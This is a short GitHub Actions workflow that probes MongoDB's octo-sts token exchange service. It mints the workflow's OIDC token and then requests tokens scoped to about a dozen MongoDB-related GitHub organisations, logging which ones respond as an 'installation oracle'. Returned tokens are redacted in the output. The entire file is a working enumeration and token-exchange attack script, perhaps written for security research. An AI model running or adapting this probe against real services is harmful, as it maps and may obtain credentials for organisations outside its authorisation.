name: octo-sts-probe
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Enumerate octo-sts installations
        run: |
          set -u
          TOK=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=octo-sts.mongodb.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
          echo "--- installation oracle across MongoDB-related orgs ---"
          for ORG in mongodb 10gen mongodb-js mongodb-labs mongodb-developer mongodb-partners mongodb-university mongodb-forks mongodb-industry-solutions mongodb-eng mongodb-enterprise mongodbinc; do
            C=$(curl -sS -o /tmp/o -w '%{http_code}' -H "Authorization: Bearer $TOK" \
              "https://octo-sts.mongodb.com/sts/exchange?scope=$ORG/x&identity=octo-sts")
            echo "  $ORG -> HTTP $C :: $(head -c 150 /tmp/o | tr -d '\n' | sed 's/"token":"[^"]*"/"token":"<REDACTED>"/')"
          done
